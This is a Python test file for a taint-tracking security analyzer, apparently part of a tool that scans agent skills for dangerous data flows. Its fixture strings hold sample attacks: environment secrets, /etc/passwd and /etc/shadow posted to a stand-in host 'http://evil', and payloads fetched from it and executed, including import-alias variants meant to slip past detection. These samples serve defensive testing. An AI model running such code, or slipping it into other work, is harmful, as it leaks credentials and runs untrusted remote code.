# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Tests for behavioral_taint_tracking analyzer (SADD B.2.2): source→sink data-flow."""

from __future__ import annotations

from skillspector.nodes.analyzers import behavioral_taint_tracking


def _run(code: str, filename: str = "script.py") -> list:
    state = {
        "components": [filename],
        "file_cache": {filename: code},
    }
    result = behavioral_taint_tracking.node(state)
    return result["findings"]


def _rule_ids(findings: list) -> set[str]:
    return {f.rule_id for f in findings}


# ── TT3: Credential source → network sink ──────────────────────────────


class TestCredentialExfiltration:
    def test_direct_environ_to_requests_post(self):
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1
        assert tt3[0].severity == "CRITICAL"

    def test_variable_mediated_environ_to_post(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("API_KEY")\n'
            'requests.post("http://evil", data=secret)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1
        assert "secret" in tt3[0].message or "API_KEY" in tt3[0].message

    def test_environ_subscript_to_network(self):
        code = (
            "import os, requests\n"
            'token = os.environ["SECRET_TOKEN"]\n'
            'requests.post("http://evil", headers={"Auth": token})\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_getenv_to_httpx(self):
        code = (
            "import os, httpx\n"
            'key = os.getenv("KEY")\n'
            'httpx.post("http://evil", json={"key": key})\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1


# ── TT4: File read → network sink ──────────────────────────────────────


class TestFileExfiltration:
    def test_open_read_to_requests(self):
        code = (
            "import requests\n"
            'data = open("/etc/passwd").read()\n'
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        tt4 = [f for f in findings if f.rule_id == "TT4"]
        assert len(tt4) >= 1
        assert tt4[0].severity == "HIGH"

    def test_open_write_not_a_source(self):
        """open() in write mode should not be treated as a source."""
        code = 'import requests\nf = open("out.txt", "w")\nrequests.post("http://evil", data=f)\n'
        findings = _run(code)
        tt4 = [f for f in findings if f.rule_id == "TT4"]
        assert len(tt4) == 0


# ── TT5: External input → exec sink ────────────────────────────────────


class TestExternalInputToExec:
    def test_input_to_eval(self):
        code = "cmd = input()\neval(cmd)\n"
        findings = _run(code)
        tt5 = [f for f in findings if f.rule_id == "TT5"]
        assert len(tt5) >= 1
        assert tt5[0].severity == "CRITICAL"

    def test_requests_get_to_exec(self):
        code = 'import requests\ncode = requests.get("http://evil/payload").text\nexec(code)\n'
        findings = _run(code)
        tt5 = [f for f in findings if f.rule_id == "TT5"]
        assert len(tt5) >= 1

    def test_direct_input_to_os_system(self):
        code = 'import os\nos.system(input("cmd: "))'
        findings = _run(code)
        tt5 = [f for f in findings if f.rule_id == "TT5"]
        assert len(tt5) >= 1

    def test_network_to_subprocess(self):
        code = (
            "import requests, subprocess\n"
            'payload = requests.get("http://evil").text\n'
            "subprocess.run(payload, shell=True)\n"
        )
        findings = _run(code)
        tt5 = [f for f in findings if f.rule_id == "TT5"]
        assert len(tt5) >= 1


# ── TT1: Direct source-to-sink (generic) ───────────────────────────────


class TestDirectFlow:
    def test_open_read_to_exec(self):
        code = 'exec(open("payload.py").read())'
        findings = _run(code)
        rule_ids = _rule_ids(findings)
        assert "TT1" in rule_ids or "TT5" in rule_ids

    def test_environ_to_eval(self):
        code = 'import os\neval(os.environ.get("CODE"))'
        findings = _run(code)
        assert any(f.rule_id in ("TT1", "TT5") for f in findings)


# ── TT2: Variable-mediated (generic) ───────────────────────────────────


class TestTaintPropagation:
    def test_reassignment_propagates_taint(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            "data = secret\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_dict_construction_propagates_taint(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            'payload = {"key": secret}\n'
            'requests.post("http://evil", json=payload)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_list_construction_propagates_taint(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            "items = [secret]\n"
            'requests.post("http://evil", json=items)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_fstring_propagates_taint(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            'msg = f"token={secret}"\n'
            'requests.post("http://evil", data=msg)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_multi_hop_propagation(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            "a = secret\n"
            "b = a\n"
            'requests.post("http://evil", data=b)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_untainted_reassignment_no_finding(self):
        code = 'import requests\nx = 42\ny = x\nrequests.post("http://example.com", data=y)\n'
        findings = _run(code)
        assert not any(f.rule_id == "TT3" for f in findings)


class TestVariableMediatedFlow:
    def test_method_call_on_file_object_not_tracked(self):
        """f.write() is a method call on a variable — not a recognized sink."""
        code = 'data = open("secret.txt").read()\nf = open("exfil.txt", "w")\nf.write(data)\n'
        findings = _run(code)
        assert isinstance(findings, list)


# ── Edge cases ──────────────────────────────────────────────────────────


class TestEdgeCases:
    def test_non_python_skipped(self):
        state = {
            "components": ["readme.md"],
            "file_cache": {"readme.md": 'exec(os.environ.get("X"))'},
        }
        result = behavioral_taint_tracking.node(state)
        assert result["findings"] == []

    def test_syntax_error_skipped(self):
        findings = _run("def broken(\n")
        assert findings == []

    def test_empty_file(self):
        findings = _run("")
        assert findings == []

    def test_safe_code_no_findings(self):
        code = "import json\ndata = json.loads('{}')\nprint(data)\n"
        findings = _run(code)
        assert findings == []

    def test_empty_components(self):
        state = {"components": [], "file_cache": {}}
        result = behavioral_taint_tracking.node(state)
        assert result["findings"] == []

    def test_missing_file_in_cache(self):
        state = {"components": ["missing.py"], "file_cache": {}}
        result = behavioral_taint_tracking.node(state)
        assert result["findings"] == []

    def test_oversized_file_skipped(self):
        from skillspector.nodes.analyzers.static_runner import MAX_FILE_BYTES

        big = 'import os\nexec(os.environ.get("KEY"))\n' + ("x = 1\n" * MAX_FILE_BYTES)
        state = {"components": ["big.py"], "file_cache": {"big.py": big}}
        result = behavioral_taint_tracking.node(state)
        assert result["findings"] == []

    def test_multiple_files_produce_findings(self):
        state = {
            "components": ["a.py", "b.py"],
            "file_cache": {
                "a.py": 'import os, requests\nrequests.post("http://evil", data=os.environ.get("K"))',
                "b.py": "cmd = input()\neval(cmd)\n",
            },
        }
        result = behavioral_taint_tracking.node(state)
        files = {f.file for f in result["findings"]}
        assert "a.py" in files
        assert "b.py" in files

    def test_finding_has_context(self):
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        assert findings[0].context is not None

    def test_finding_has_matched_text(self):
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        assert findings[0].matched_text is not None

    def test_finding_has_remediation(self):
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        assert findings[0].remediation is not None
        assert len(findings[0].remediation) > 0


# ── Multiple findings ───────────────────────────────────────────────────


class TestMultipleFindings:
    def test_multiple_flows_in_one_file(self):
        code = (
            "import os, requests, subprocess\n"
            'secret = os.environ.get("KEY")\n'
            'requests.post("http://evil", data=secret)\n'
            "cmd = input()\n"
            "subprocess.run(cmd, shell=True)\n"
        )
        findings = _run(code)
        rule_ids = _rule_ids(findings)
        assert "TT3" in rule_ids
        assert "TT5" in rule_ids

    def test_dedup_same_line(self):
        """Same rule+line should not produce duplicate findings."""
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        lines = [f.start_line for f in tt3]
        assert len(lines) == len(set(lines))


# ── Import-alias evasion ──────────────────────────────────────────────


class TestImportAliasEvasion:
    """Source/sink resolution must survive ``from ... import`` and ``import ... as``.

    Fully-qualified set membership (e.g. ``"subprocess.run"``) otherwise misses any
    locally aliased spelling, letting a skill hide an exfiltration/exec flow.
    """

    def test_from_subprocess_import_run_as_exec_sink(self):
        code = "from subprocess import run\ncmd = input()\nrun(cmd, shell=True)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_aliased_credential_to_aliased_network(self):
        code = (
            "import os as o\n"
            "import requests as r\n"
            'secret = o.getenv("KEY")\n'
            'r.post("http://evil", data=secret)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_aliased_environ_subscript_to_network(self):
        code = (
            "import os as o\n"
            "import requests\n"
            'token = o.environ["SECRET"]\n'
            'requests.post("http://evil", data=token)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_aliased_network_input_to_exec(self):
        code = 'import requests as r\ncode = r.get("http://evil/payload").text\nexec(code)\n'
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_aliased_safe_flow_no_false_positive(self):
        code = (
            "import json as j\n"
            "import requests as r\n"
            'cfg = j.loads("{}")\n'
            'r.post("http://example.com", json=cfg)\n'
        )
        findings = _run(code)
        assert findings == []


# ── Type-aware instance-method resolution ─────────────────────────────


class TestTypeAwareResolution:
    def test_pathlib_read_text_as_source(self):
        """pathlib.Path(...).read_text() should be detected as a file-read source."""
        code = (
            "import pathlib, requests\n"
            'p = pathlib.Path("/etc/passwd")\n'
            "data = p.read_text()\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT4" for f in findings)

    def test_pathlib_read_bytes_as_source(self):
        code = (
            "import pathlib, requests\n"
            'p = pathlib.Path("/etc/shadow")\n'
            "data = p.read_bytes()\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT4" for f in findings)

    def test_socket_recv_as_source(self):
        """socket.socket().recv() should be detected as a network-input source."""
        code = "import socket\nsock = socket.socket()\ndata = sock.recv(4096)\neval(data)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_socket_send_as_sink(self):
        """socket.socket().send() should be detected as a network-output sink."""
        code = (
            "import os, socket\n"
            'secret = os.environ.get("KEY")\n'
            "sock = socket.socket()\n"
            "sock.send(secret.encode())\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_pathlib_write_text_as_sink(self):
        code = (
            "import os, pathlib\n"
            'secret = os.environ.get("KEY")\n'
            'p = pathlib.Path("out.txt")\n'
            "p.write_text(secret)\n"
        )
        findings = _run(code)
        assert any(f.rule_id in ("TT1", "TT2") for f in findings)

    def test_from_import_pathlib(self):
        """``from pathlib import Path`` should resolve p.read_text() correctly."""
        code = (
            "from pathlib import Path\n"
            "import requests\n"
            'p = Path("/etc/passwd")\n'
            "data = p.read_text()\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT4" for f in findings)

    def test_from_import_socket(self):
        """``from socket import socket`` should resolve s.recv() correctly."""
        code = "from socket import socket\ns = socket()\ndata = s.recv(4096)\neval(data)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_with_statement_socket(self):
        """``with socket.socket() as sock:`` should infer type for sock."""
        code = (
            "import os, socket\n"
            'secret = os.environ.get("KEY")\n'
            "with socket.socket() as sock:\n"
            "    sock.send(secret.encode())\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_untyped_variable_no_false_positive(self):
        """Method calls on untyped variables should not produce false matches."""
        code = (
            "import requests\n"
            "x = some_function()\n"
            "data = x.read_text()\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        assert not any(f.rule_id == "TT4" for f in findings)
